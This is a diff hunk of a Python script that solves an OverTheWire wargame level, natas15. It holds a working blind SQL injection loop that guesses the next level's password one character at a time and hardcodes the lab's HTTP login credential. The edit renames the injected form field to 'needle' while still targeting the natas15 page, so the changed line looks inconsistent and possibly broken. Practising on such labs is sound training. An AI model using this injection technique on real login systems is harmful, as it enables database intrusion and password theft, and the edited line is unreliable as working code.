@@ -20,7 +20,7 @@ password = ''
 for i in range(0, 35):
     spaces = '_'*i
     for char in charsInPass:
-        r = requests.post("http://natas15.natas.labs.overthewire.org/index.php", data={"username":f"natas16\" and password like BINARY \"{password}{char}%"}, auth = HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
+        r = requests.post("http://natas15.natas.labs.overthewire.org/index.php", data={"needle":f"natas16\" and password like BINARY \"{password}{char}%".encode()}, auth = HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
         if "This user doesn't exist" not in r.text:
             password+=char
             print(password)
